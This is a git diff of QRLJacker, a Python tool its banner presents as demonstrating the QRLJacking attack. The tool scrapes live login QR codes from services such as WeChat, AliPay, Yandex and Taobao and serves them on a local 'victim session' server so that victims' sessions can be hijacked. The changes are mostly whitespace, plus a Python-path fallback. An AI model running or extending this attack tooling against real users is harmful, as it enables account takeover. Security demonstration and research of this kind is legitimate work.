@@ -34,8 +34,12 @@ settings = configparser.ConfigParser()
 def Serve_it(port=1337):
 	def serve(port):
 		if os.name=="nt":
-			print " [*]  on http://localhost:"+str(port)
-			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
+			try:
+				print " [*]  on http://localhost:"+str(port)
+				os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
+			except:
+				print " [*]  on http://localhost:"+str(port)
+				os.system(str(sys.executable)+" -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
 		else:
 			print " [*] Starting victim session on http://localhost:"+str(port)
 			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
@@ -121,7 +125,7 @@ def Yandex():
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
 			print " [*] QR code image detected !"
@@ -145,7 +149,7 @@ def Airdroid():
 	img_number = 16
 	refresh = 0
 	while True:
-		
+
 		try:
 			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
 			print " [*] Clicking to reload QR code image..."
@@ -178,7 +182,7 @@ def Weibo():
 	driver.get("http://weibo.com/login.php")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[len(imgs)-1]
@@ -201,7 +205,7 @@ def WeChat():
 	driver.get("https://web.wechat.com")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[0]
@@ -222,7 +226,7 @@ def AliPay():
 	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
-		
+
 		try:
 			c = driver.find_element_by_class_name('ui-nav')[0]
 			t = c.find_elements_by_tag_name("li")[0]
@@ -256,7 +260,7 @@ def Taobao():
 	driver.get("https://login.taobao.com")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			button_class = web.find_element_by_class_name("msg-err")
 			button = button_class.find_elements_by_tag_name("a")[0]
@@ -285,7 +289,7 @@ def mydigipass():
 	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[1]
@@ -308,7 +312,7 @@ def Zapper():
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			c = web.find_elements_by_id("qrcodecontainer2")
 			img = c[0].find_elements_by_tag_name("img")[0]
@@ -332,7 +336,7 @@ def Trustly_App():
 	driver.get("https://trustlyapp.com/backend")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			c = web.find_elements_by_class_name("qrcode-tab")[0]
 			img = c.find_elements_by_tag_name("img")[0]
@@ -353,7 +357,7 @@ def Yelophone():
 	driver.get("https://www.yelophone.com/app#/login")
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			c = web.find_elements_by_id("qrcode")[0]
 			print " [*] QR code image detected !"
@@ -585,7 +589,7 @@ def First_Method(classname,url,image_number,s=10):
 	driver.get(url)
 
 	while True:
-		
+
 		try:
 			login = driver.find_element_by_class_name(classname)
 			img = login.find_elements_by_tag_name('img')[int(image_number)]
@@ -608,7 +612,7 @@ def Second_Method(url,image_number,s=10):
 	driver.get(url)
 	time.sleep(5)
 	while True:
-		
+
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[int(image_number)]
@@ -631,7 +635,7 @@ def Third_Method(url,image_number,s=10):
 	driver.get(url)
 	time.sleep(10)
 	while True:
-		
+
 		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
 			img = driver.find_elements_by_tag_name("img")[int(image_number)]
@@ -652,12 +656,12 @@ def main():
 	clear()
 	print """
 
-   ____  _____  _          _            _             
-  / __ \|  __ \| |        | |          | |            
- | |  | | |__) | |        | | __ _  ___| | _____ _ __ 
+   ____  _____  _          _            _
+  / __ \|  __ \| |        | |          | |
+ | |  | | |__) | |        | | __ _  ___| | _____ _ __
  | |  | |  _  /| |    _   | |/ _` |/ __| |/ / _ \ '__|
- | |__| | | \ \| |___| |__| | (_| | (__|   <  __/ |   
-  \___\_\_|  \_\______\____/ \__,_|\___|_|\_\___|_|                                                                                                              
+ | |__| | | \ \| |___| |__| | (_| | (__|   <  __/ |
+  \___\_\_|  \_\______\____/ \__,_|\___|_|\_\___|_|
   #QRLJacker is a customizable framework to demonstrate "QRLJacking Attack Vector" and shows How easy to hijack services that relies on QR Code Authentication!
   #A Social Engineering Attack Vector by: Mohamed A. Baset (@SymbianSyMoh)
   #Coded by: Karim Shoair (@D4Vinci)
